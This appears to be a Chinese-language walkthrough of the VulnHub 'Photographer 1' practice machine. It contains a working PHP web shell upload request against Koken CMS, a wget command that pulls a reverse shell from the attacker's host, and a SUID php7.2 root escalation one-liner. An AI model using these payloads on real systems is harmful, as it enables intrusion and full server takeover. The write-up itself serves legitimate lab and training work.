# Photographer 1

> https://download.vulnhub.com/photographer/Photographer.ova

靶场IP：`192.168.32.220`

扫描对外端口服务

```
┌──(root💀kali)-[/tmp]
└─# nmap -p 1-65535 -sV  192.168.32.220                                                                                                                                                                                                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 09:25 EDT
Nmap scan report for 192.168.32.220
Host is up (0.00084s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18
MAC Address: 00:0C:29:6D:C7:60 (VMware)
Service Info: Hosts: PHOTOGRAPHER, example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.65 seconds

```

访问80端口

![image-20220910212739323](../../.gitbook/assets/image-20220910212739323-1675840178089981.png)

访问8000端口

![image-20220910212814645](../../.gitbook/assets/image-20220910212814645-1675840178089982.png)

查看共享目录

```
┌──(root💀kali)-[/tmp]
└─# smbclient -L //192.168.32.220                                  
Password for [WODGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

```
┌──(root💀kali)-[/tmp]
└─# smbclient //192.168.32.220/sambashare      
Password for [WODGROUP\root]:
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Mon Jul 20 21:30:07 2020
  ..                                  D        0  Tue Jul 21 05:44:25 2020
  mailsent.txt                        N      503  Mon Jul 20 21:29:40 2020
  wordpress.bkp.zip                   N 13930308  Mon Jul 20 21:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (81.9 KiloBytes/sec) (average 81.9 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (77294.4 KiloBytes/sec) (average 74748.9 KiloBytes/sec)

```

查看文件和压缩包

```
┌──(root💀kali)-[/tmp]
└─# cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)

```

![image-20220910213320623](../../.gitbook/assets/image-20220910213320623-1675840178089983.png)

使用发现的邮件发送文件 ( daisa@photographer.com )中的电子邮件地址以及可能的密码 (babygirl)，我能够登录到 Koken 管理面板！

![image-20220910213347437](../../.gitbook/assets/image-20220910213347437-1675840178089984.png)

我找到了一个上传图片的地方，以及一个可能的[任意文件上传漏洞](https://www.exploit-db.com/exploits/48706)。

```
POST /api.php?/content HTTP/1.1
Host: 192.168.32.220:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------34894293281905435762178263200
Content-Length: 1082
Origin: http://192.168.32.220:8000
Connection: close
Referer: http://192.168.32.220:8000/admin/
Cookie: koken_referrer=; koken_session_ci=UIqUcU2xN1NuOIh%2FLOItrSghTcuoFDpsLgI%2BfWXZ8APyVYXX3I6ZO8B%2BvlirgPFlL3YXmERLfbgC20t86lLXjZ87QLUbuzcSPc42HY2bw%2B3U94z5V8VuuY3Y15WOnrnpInL5Tvrge11uY3LGy7oAJfQr8b0qJFNVN49cUibuaV1iIus2vBBcEmUM5StwhgN5turgSr6OSvYVzPG0rXf7sUa2zdM9jnD1fVOSECEjyRmQYXWpvA1gs2XE61c7J8ATR5nNZVZ%2FBsU51eVYPpQWKN8%2FbeSDY6knIzAVUv3eQ62ltlfW6i6xhjb737GKu2IDErhPC2BBUbN3oPwweirprpB5UEnISRszBziRgOgx3F5QW24quEWNDgvMOhM%2FdkiQXWNpksdCu3BZVjYVJww5ZHhnO907g%2B69Pxi7zjM0%2BUnCzVnFtJsfi%2BqtlHNe8UK%2Bbq7aSjOVCkswvMzpxtGLj1a%2BzPn2EdO8WgMNtHkQ9G9s05zrnwbH0lYoasvlyLw%2FjSwPH8vhsSS7JaKyK9qrOkSoJelXq8fE9Mjc2QYD3nY6u203Mc7Sm4ejOIQNMJMLCibx8JjMX4mFQLUm%2FeF%2BSP9%2F2yCm8nRAe8BzlQdpkN9mRuOqeDZUFshEzYF27xTGH4yZ5VKGBzKPBnzvxN5UUxPFMe2dzHOxIkHOk39M8iz1Y5sRJk%2FST7dk%2FulgIKpwxjD5QdluDzrakvp%2F35Wj9uGEa0q5pGUb1FvxA4yCAfM9T31aA%2B%2ByYeaoUdLPtR1OYHXjopoNX0B8rYFBwLIEBRZPAfFSjh2FkqKnz7OiKCxry5YYLQUnt6QUtuK4ihdY%2BF7qCTNfH7ny0JEaApxHz7vLXyYPGwIk%2FeD233bskPIgNJ2sTs1ovd9rnw%2B8aO7ol4Dcmje57W7JPLyrNCT%2Bep7Bp8U%2B07LpKo9Uhl5ry8s%2F1ZbBK21YVpZvSO7qPNWGoNaFumgbYzNG4y%2BBr%2Fq9lyfrSRoTKGj2VQhQfdKZfDjxq4VOGe4tTk1%2FyebO3E9m9jWZGnEjUUnamAv7N9L%2FWY81uHQE5qQ2ozO0AHFF3X1FGEMTelzFxq8d6CmTcQ4moNObZYJjIzMlJ8lSjPHJnzeP9sXVAuYnujVNBPD9br2LbtTIWzRcmClX5dQCTQKOIDrnC4wvLwKxhJdozdk6wNVXOQH%2F5YIun20WmWNJVO%2BDB5yNenqTjycpkIPdDjn7QgziPxQgfPAMu2JXNa0Q4j6C3nHRPVv0bWN5a7s3m3iCHD2%2F15%2BwL0bqZdDeeKnL9ead5a28d305522e0449dc133bccf5edd2ba7c8c

-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="name"

shell.php
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="chunk"

0
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="chunks"

1
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="upload_session_start"

1662817071
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="visibility"

public
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="license"

all
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="max_download"

none
-----------------------------34894293281905435762178263200
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

-----------------------------34894293281905435762178263200--

```

![image-20220910214418554](../../.gitbook/assets/image-20220910214418554-1675840178089985.png)

![image-20220910214428520](../../.gitbook/assets/image-20220910214428520-1675840178089986.png)

下载反弹shell

```
shell.php?cmd=wget http://192.168.32.130/shell.php -O 1.php
```

反弹连接成功

```
www-data@photographer:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su

```

php提权

```
ww-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
<sr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"                         
bash-4.3# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
proof.txt
bash-4.3# cat proof.txt
cat proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
bash-4.3# 

```

